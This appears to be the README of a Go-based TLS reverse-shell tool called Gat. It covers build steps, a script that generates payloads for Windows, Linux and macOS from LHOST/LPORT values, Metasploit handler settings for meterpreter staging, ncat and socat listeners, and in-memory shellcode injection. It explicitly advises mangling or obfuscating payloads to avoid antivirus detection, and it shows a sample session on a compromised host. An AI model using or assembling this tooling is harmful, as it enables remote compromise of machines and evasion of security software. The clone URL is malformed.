# Gat
Golang Access Tool
Simple TCP reverse shell written in [Go](https://golang.org).
It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.

Supported OS are:

- Windows
- Linux
- Mac OS
- FreeBSD and derivatives

## Getting started & dependencies

Since this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
your Golang environment.\
(with the `$GOPATH` environment variable).

```
git clone https://github.comm1ddl3w4r3/Gat.git
cd Gat
go mod init Gat/Gat
go mod tidy
go get github.com/Binject/debug/pe
go build Mangle.go
```
## Usage
Gat will use 'MSF's Multi Handler' by default.(If listener selected)\
Other options are available such as:

*socat\
*ncat

These shells can be upgraded to meterpreter shells using the 'meterpreter' command in Gat.

##Gat.sh to make things easy.
***WARNING*** Change CN 
```
./Gat.sh - Will show example and ascii art.
./Gat.sh [ Windows|Mac|Linux ] <LHOST> <LPORT> - Will generate given OS type payload.
./Gat.sh Cleanup - Will cleanup past deployments.
```

This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.

The following special commands are supported:

* ``shell`` : drops you an system shell (allowing you, for example, to change directories)
* ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it
* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https meterpreter agent from metasploit, and execute the shellcode in memory (Windows only at the moment)
* ``exit`` : exit gracefully


## Examples

### Basic usage



## Meterpreter staging
**WARNING**: this currently only work for the Windows platform.

The meterpreter staging currently supports the following payloads :

* `windows/x64/meterpreter/reverse_tcp`
* `windows/x64/meterpreter/reverse_http`
* `windows/x64/meterpreter/reverse_https`

To use the correct one, just specify the transport you want to use (tcp, http, https)
To use the meterpreter staging feature, just start your handler:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 8443
set HandlerSSLCert ./server.pem
exploit -j
```

Then, in `Gat`, use the `meterpreter` command:

```bash
[Gat]> meterpreter https 127.0.0.1:8443
```

A new meterpreter session should pop in `msfconsole`:

```bash
[13:37:00][127.0.0.1][Sessions: 0][Jobs: 1] exploit(multi/handler) >
[*] [2022.02.22-13:37:00] https://127.0.0.1:8443 handling request from 127.0.0.1; (UUID: uxec7w3h) Staging x64 payload (206937 bytes) ...
[*] meterpreter session 1 opened (127.0.0.1:8443 -> 127.0.0.1:44804) at 2022-02-22 13:37:00 +0100

[13:37:03][127.0.0.1][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  EVILCORP\sconner @ LWS01  127.0.0.1:8443 -> 127.0.0.1:44804 (127.0.0.1)

[13:37:05][127.0.0.1][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: LWS01\sconner
```
Here is an example with `ncat`:

```
ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
```

'socat' example (tested with version `1.7.3.2`):
```
socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
```

## Manually create GAT for more custom setup.
***WARNING*** Generating this way will not apply mangle to the payload and could be caught by AV. \
(Make sure to obfuscate it if you do this.)

You will need to generate a valid certificate:
```bash
$ make depends
openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

For windows:

```bash
# Predifined 32 bit target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make windows64 LHOST=192.168.0.12 LPORT=1234
```

For Linux:
```bash
# Predifined 32 bit target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make linux64 LHOST=192.168.0.12 LPORT=1234
```

For Mac OS X
```bash
# Predifined 32 bit target
$ make macos32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make macos64 LHOST=192.168.0.12 LPORT=1234
```

## Credits
Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
